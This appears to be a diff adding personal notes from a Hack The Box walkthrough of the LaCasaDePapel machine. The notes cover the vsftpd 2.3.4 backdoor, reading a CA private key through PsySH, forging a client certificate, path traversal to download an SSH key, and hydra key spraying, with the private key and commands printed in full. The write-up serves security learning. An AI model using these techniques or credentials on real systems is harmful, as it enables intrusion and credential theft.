@@ -1,0 +1,202 @@
+# Recon
+## comm/all tcp
+21/tcp   open  ftp      vsftpd 2.3.4
+22/tcp   open  ssh      OpenSSH 7.9 (protocol 2.0)
+80/tcp   open  http     Node.js (Express middleware)
+443/tcp  open  ssl/http Node.js Express framework
+6200/tcp open  lm-x?
+
+# Enum
+## 21 FTP
+anonymous failed.
+
+find exploit:
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                    | exploits/unix/remote/17491.rb
+
+tried the exploit => no die. it says the thing on port 6200 is not a shell.
+
+somehow after this exploit, the port 6200 is open, so i guess the default shell is not standard /bin/bash.
+
+## 80 HTTP
+find form:
+<form method="POST">
+<input type="image" src="/qrcode?qrurl=otpauth%3A%2F%2Fhotp%2FToken%3Fsecret%3DHY6EQ3RRO5HHQWTLPNTS4ZS5IB6WM3RY%26algorithm%3DSHA1" readonly="readonly" onclick="return false">
+<input name="secret" type="hidden" value="HY6EQ3RRO5HHQWTLPNTS4ZS5IB6WM3RY">
+<input name="token" type="text" placeholder="ONE PASSWORD" autocomplete="off">
+<input name="email" type="email" placeholder="E-MAIL" autocomplete="off">
+<button>GET FREE TRIAL</button></form>
+
+/qrcode?qrurl=otpauth%3A%2F%2Fhotp%2FToken%3Fsecret%3DHY6EQ3RRO5HHQWTLPNTS4ZS5IB6WM3RY%26algorithm%3DSHA1
+=> url decode =>
+/qrcode?qrurl=otpauth://hotp/Token?secret=HY6EQ3RRO5HHQWTLPNTS4ZS5IB6WM3RY&algorithm=SHA1
+
+visit /qrcode =>
+Error: Bad data
+    at encode (/home/oslo/node_modules/qr-image/lib/encode.js:147:15)
+    at QR (/home/oslo/node_modules/qr-image/lib/qr-base.js:170:19)
+at Object.qr_image [as image] (/home/oslo/node_modules/qr-image/lib/qr.js:48:18)
+    at /home/oslo/server.js:60:19
+    at Layer.handle [as handle_request] (/home/oslo/node_modules/express/lib/router/layer.js:95:5)
+    at next (/home/oslo/node_modules/express/lib/router/route.js:137:13)
+    at Route.dispatch (/home/oslo/node_modules/express/lib/router/route.js:112:3)
+at Layer.handle [as handle_request] (/home/oslo/node_modules/express/lib/router/layer.js:95:5)
+    at /home/oslo/node_modules/express/lib/router/index.js:281:22
+at Function.process_params (/home/oslo/node_modules/express/lib/router/index.js:335:12)
+
+=>
+so we know there is a path /home/oslo and module qr-image
+and there is a secret HY6EQ3RRO5HHQWTLPNTS4ZS5IB6WM3RY and algorithm is SHA1.
+
+gobuster => Nothing
+
+## 443 https
+"Sorry, but you need to provide a client certificate to continue."
+
+nothing interesting in the certificate.
+
+## 6200 Psy shell
+said we cannot use shell_exec
+
+tried to use nc to connect =>
+Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
+
+enter `data` => PHP Warning:  shell_exec() has been disabled for security reasons in phar://eval()'d code on line 1
+
+read help doc, ls => $tokyo, then show its content:
+ class Tokyo {
+  private function sign($caCert,$userCsr) {
+          $caKey = file_get_contents('/home/nairobi/ca.key');
+          $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=>'sha256']);
+          openssl_x509_export($userCert, $userCertOut);
+          return $userCertOut;
+  }
+ }
+Looks like it creates user certification.
+
+luckily, the read file content function is enabled:
+$section = file_get_contents('/home/nairobi/ca.key');
+=>
+-----BEGIN PRIVATE KEY-----\n
+MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
+7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
+2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
+uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
+YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
+s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
+PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
+Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
+1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
+/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
+q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
+uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
+I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
+7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
+G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
+sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
+CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
+sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
+ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
+zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
+ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
+9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
+WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
+7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
+aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
+53udBEzjt3WPqYGkkDknVhjD\n
+-----END PRIVATE KEY-----\n
+
+(need to remove the \n)
+
+also tried to read their authorized_keys under /home/oslo and /home/nairobi, no dice.
+read the Tokyo again, we only have two unknown variables $userCsr and $caCert.
+Assume the $caCert is the same one that we downloaded from HTTPS ssl cert.
+Thus we only need to craft the $userCsr
+
+## Back to HTTPS
+crafted a php script to generate such cert. Use curl and got a private page:
+curl -v \
+--insecure \ --cacert ./ca.crt \
+--key ./generated/private.key \
+--cert ./generated/user.crt \
+https://10.10.10.131
+=> a page that has title "PRIVATE AREA"
+
+Also used php's openssl_pkcs12_export, and tried curl:
+curl -v --insecure --cert-type P12 --cert ./generated/user_pkcs12.crt:zhe0ops https://10.10.10.131 
+=> success. But somehow burpsuit and firefox didn't use this imported pkcs12 key.
+
+Tried the proxy, set up cert, no dice. But google "burp suite provide client certificate"
+=> find this tutorial: https://www.smeegesec.com/2013/05/using-client-ssl-certificates-with-burp.html
+=> set such certificate in the user option, and it works.
+
+### Explore Private Area
+the web page allows me to choose session-1 and session-2:
+https://lacasadepapel.htb/?path=SEASON-2
+
+tried SEASON-3, error message =>
+Error: ENOTDIR: not a directory, scandir '/home/berlin/downloads/SEASON-3/'
+at Object.fs.readdirSync (fs.js:904:18)
+    at /home/berlin/server.js:10:20
+    at Layer.handle [as handle_request] (/home/berlin/node_modules/express/lib/router/layer.js:95:5)
+    at next (/home/berlin/node_modules/express/lib/router/route.js:137:13)
+    at Route.dispatch (/home/berlin/node_modules/express/lib/router/route.js:112:3)
+at Layer.handle [as handle_request] (/home/berlin/node_modules/express/lib/router/layer.js:95:5)
+    at /home/berlin/node_modules/express/lib/router/index.js:281:22
+    at Function.process_params (/home/berlin/node_modules/express/lib/router/index.js:335:12)
+at next (/home/berlin/node_modules/express/lib/router/index.js:275:10)
+    at expressInit (/home/berlin/node_modules/express/lib/middleware/init.js:40:5"
+
+It said "not a directory", so we should try diretory path.
+tried with ../../../../../etc/ => get a list of files, but cannot download files
+
+SESSION-1 and SESSION-2 shows some videos.
+write a list of their hrefs and use wget to download all of them => all of them are empty!
+
+download link is like /file/U0VBU09OLTEvMTMuYXZp
+U0VBU09OLTEvMTMuYXZp => base64 -d => SEASON-1/13.avi
+=> So the /file/ is the directory /home/berlin/downloads/
+=> So, the server actually use base64 -d first then download files with prefix path "/file/".
+
+try this https://lacasadepapel.htb/?path=../.ssh => find creds
+../.ssh/id_rsa => base64 => Li4vLnNzaC9pZF9yc2E=
+
+`wget --certificate=./generated/user.crt --private-key=./generated/private.key https://10.10.10.131/file/Li4vLnNzaC9pZF9yc2E= --no-check-certificate -O id_rsa`
+=> successfully downloaded ssh key
+=> somehow it cannot connect ssh to it.
+=> download authorized_keys and id_rsa.pub => the authorized key belongs to thek@ThekMac.local 
+
+didn't find such user in /home
+find following users:
+berlin
+dali
+nairobi
+oslo
+professor
+
+hydra -L users.txt -p id_rsa 10.10.10.131 sshkey
+=> professor is ok!
+
+# Priv Esc
+ps auxw =>
+/usr/bin/memcached -d -p 11211 -U 11211 -l 127.0.0.1 -m 64 -c 1024 -u memcached -P /var/run/memcached/memcached-11211.pid
+3267 dali      0:00 /usr/bin/node /home/dali/server.js
+3268 nobody    0:02 /usr/bin/node /home/oslo/server.js
+3269 berlin    0:01 /usr/bin/node /home/berlin/server.js
+3270 nobody    0:10 /usr/bin/node /home/nairobi/server.js
+8388 root      0:00 {supervisord} /usr/bin/python2 /usr/bin/supervisord --nodaemon --pidfile /var/run/supervisord.pid --configuration /etc/supervisord.conf
+
+dali's shell is pysh => maybe it is the one listens on port 6200
+confirmed by letting 6200 psysh read dali's server.js
+
+sum what we have found now:
+- berlin: 443 https. Has .ssh. We can use https to read his files.
+- dali: Has .ssh. But only thek@ThekMac.local in authorized_keys => not likely to be owned.
+- nairobi: it has ca.key. Maybe it is the CA. No .ssh.
+- oslo: 80 qr-image. No .ssh.
+- professor: owned.
+
+use fine -user/-group on these users, didn't find any interesting files.
+
+use pspy64 -f => guessed the root is using /home/professor/memcached.ini to execute commands.
+
+=> root
